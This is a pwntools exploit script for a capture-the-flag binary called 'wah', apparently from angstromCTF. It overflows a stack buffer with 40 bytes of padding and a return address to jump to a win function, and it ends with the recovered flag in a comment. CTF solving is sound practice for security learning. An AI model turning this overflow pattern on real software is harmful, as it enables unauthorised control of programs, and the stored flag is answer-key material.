from pwn import *
elf = ELF("wah")
#libc = ELF("")
context.log_level = "debug"

ip,port = "challs.actf.co", 31224

if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(ip, port)
else:
    r = process(elf.path)

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()


flag = p64(0x401236)
payload = b"A"*40 + flag
s(payload)
r.interactive()

#actf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}